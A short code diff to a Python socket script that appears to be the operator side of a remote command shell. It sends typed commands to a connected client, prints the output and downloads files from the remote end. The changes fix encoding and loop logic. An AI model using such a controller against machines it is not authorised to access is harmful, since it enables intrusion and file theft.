@@ -23,17 +23,18 @@ def connect():
 
 def listen():
     while True:
-        cmd = input("user-$").encode()
+        cmd_str = input("user-$")
+        cmd = cmd_str.encode("utf-8")
         if not cmd:
             continue
         c.send(cmd)
-        if str(cmd) == 'download':
+        if cmd_str == 'download':
             download()
             continue
-        data = c.recv(1024).decode()
-        print (data)
-        if str(data) == 'q':
+        if cmd_str == 'q':
             break
+        data = c.recv(1024).decode("utf-8")
+        print(str(data))
 
 def close():
     c.close()
@@ -44,7 +45,7 @@ def download():
     c.send(filename)
     f = open(filename, 'wb')
     i = c.recv(1024)
-    while not ('complete' in str(i)):
+    while 'complete' not in str(i):
         f.write(i)
         i = c.recv(1024)
     f.close()
